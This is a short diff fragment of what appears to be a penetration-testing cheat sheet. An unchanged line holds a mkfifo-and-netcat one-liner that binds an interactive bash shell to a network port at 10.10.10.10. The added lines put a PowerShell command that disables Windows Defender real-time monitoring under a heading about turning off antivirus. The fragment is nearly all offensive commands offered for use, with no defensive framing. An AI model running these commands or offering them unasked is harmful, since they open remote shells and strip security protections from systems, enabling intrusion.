@@ -71,4 +71,7 @@ rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.10.10.10 77
 REVERSE SHELL 
 The target acts as a client
 
-USING POWERSHELL TO DISABLE 
+USING POWERSHELL TO DISABLE ANTIVIRUS
+```powershell
+Set-MpPreference -DisableRealtimeMonitoring $true
+```
